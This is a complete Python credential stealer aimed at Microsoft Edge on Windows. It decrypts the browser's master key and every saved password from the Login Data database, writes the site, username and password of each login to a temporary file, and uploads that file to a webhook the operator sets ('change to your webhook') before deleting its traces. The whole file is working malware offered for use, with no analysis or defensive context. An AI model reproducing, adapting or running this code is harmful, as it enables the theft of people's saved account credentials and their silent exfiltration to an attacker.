import os
import sqlite3
import json
import shutil
import win32crypt
import base64
import requests
from Cryptodome.Cipher import AES

e_p = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")
t_p = os.path.join(os.getenv("TEMP"), "ldc.db")
p_p = os.path.join(os.getenv("TEMP"), "pwd.txt")
w_u = "webhook" # change to your webhook

def g_k():
    k_p = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Local State")
    with open(k_p, "r", encoding="utf-8") as f:
        l_s = json.load(f)
    e_k = base64.b64decode(l_s["os_crypt"]["encrypted_key"])
    e_k = e_k[5:]
    return win32crypt.CryptUnprotectData(e_k, None, None, None, 0)[1]

def d_p(e_p, k):
    try:
        if e_p[:3] == b'v10':
            iv = e_p[3:15]
            e_p = e_p[15:]
            c = AES.new(k, AES.MODE_GCM, iv)
            d_p = c.decrypt(e_p[:-16])
            return d_p.decode()
        else:
            return win32crypt.CryptUnprotectData(e_p, None, None, None, 0)[1].decode()
    except:
        return "[Unable to decrypt]"

def x_p():
    shutil.copy2(e_p, t_p)
    c = sqlite3.connect(t_p)
    cur = c.cursor()
    
    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
    k = g_k()
    
    with open(p_p, "w", encoding="utf-8") as f:
        for r in cur.fetchall():
            u, n, e_p = r
            if n and e_p:
                p = d_p(e_p, k)
                f.write(f"Website: {u}\nUsername: {n}\nPassword: {p}\n{'-'*50}\n")
    
    c.close()
    os.remove(t_p)
    
    with open(p_p, "rb") as f:
        requests.post(w_u, files={"file": f})
    os.remove(p_p)

if __name__ == "__main__":
    x_p()
